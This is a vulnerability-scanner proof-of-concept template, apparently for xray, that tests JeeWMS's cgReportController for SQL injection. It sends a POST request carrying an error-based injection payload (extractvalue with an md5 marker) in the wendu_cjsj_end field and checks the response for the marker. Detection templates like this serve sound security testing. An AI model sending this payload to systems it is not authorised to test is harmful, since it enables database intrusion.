name: poc-yaml-jeewms-cgreportcontroller-wendu-cjsj-end-sqli
binding: 95c4cc43-7cfd-402e-95ec-fcaa9abbea31
manual: true
detail:
    author: junfei.song@chaitin.com
    links:
        - https://www.yunsee.cn/cms/8464
    vulnerability:
        id: CT-529769
        level: high
transport: http
set:
    r1: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: ^/jeewms/cgReportController.do?datagrid&configId=wm_wendubb
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
            body: page=1&rows=10&searchColums=&undefined=&wendu_cjsj_begin=&wendu_cjsj_end=%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2Cmd5%28{{r1}}%29%29%29and%27&wendu_dd=
        expression: response.body.bcontains(bytes(md5(string(r1))))
expression: r0()
